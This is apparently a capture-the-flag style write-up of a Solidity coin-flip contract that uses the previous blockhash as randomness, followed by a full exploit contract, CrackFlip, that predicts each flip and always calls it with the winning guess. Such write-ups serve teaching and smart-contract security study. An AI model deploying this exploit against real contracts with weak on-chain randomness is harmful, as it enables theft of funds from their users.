### Vulnerable Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

See the vulnerability ?
The randomness is bases on the last blockhash lol
We can litteraly bypass that building an exploit contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './CoinFlip.sol';

contract CrackFlip {
	CoinFlip public originalContract = CoinFlip(my_contract_instance_address); // getting the smart contract instance to interact with it
	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; // the FACTOR for the "randomness" lol
    
    function crack(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        if (side == _guess) {
            originalContract.flip(_guess); // if true or false
        } else {
            originalContract.flip(!_guess); // if true or false again so ez win free money lmao
        }
    }
}
```

When calling the function `crack()` and putting either `true` or `false` as the parameter, this will always result of guessing it